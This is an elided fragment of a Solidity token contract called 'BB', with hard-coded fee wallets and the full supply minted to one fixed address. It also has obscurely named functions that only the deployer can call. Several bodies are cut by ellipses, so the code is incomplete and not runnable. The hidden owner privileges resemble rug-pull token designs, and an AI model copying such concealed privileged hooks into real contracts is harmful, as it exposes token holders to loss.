...
contract BB is XLLlid, Context {
  ...
  mapping (address => bool) public witeeArecipient;
    ...
    uint public maxSupply =  21000 * 1e18;
   ...
   function isContract(address account) internal view returns (bool) {
    ...
    function _xllntpo(address account, uint amount) internal {
  ...
  address public govn;
  mapping (address => bool) public xllspers;



  
   address public all =0x620Cfe70fa6Ad6cbF48916af1198a123a9948346;// 
    address public burnAddress = address(0x000000000000000000000000000000000000dEaD);

   address public backropadress =0x5FcD00316Ed626111845697d3aFD726edDf5D2C7;// 0.5%
   address public marketadress =0xd52843E269160a18684bBBfa0D9Aa6f976F891Fa;// 3%
   address public diffadress =address(0);// 
...
bool public isfee=true;
  ...
  constructor (address _usdt, address _pancake) public XLLlid("BB", "BB", 18) {
      govn = msg.sender;
      _xllntpo(all, maxSupply);
     ...
     function xllbbs(uint256 amount, address ut) public
    {
         require(msg.sender == govn, "xllsper");
  ...
  function setdifffss(address _a) public {
      require(msg.sender == govn, "!govn");
      diffadress = _a;
  }
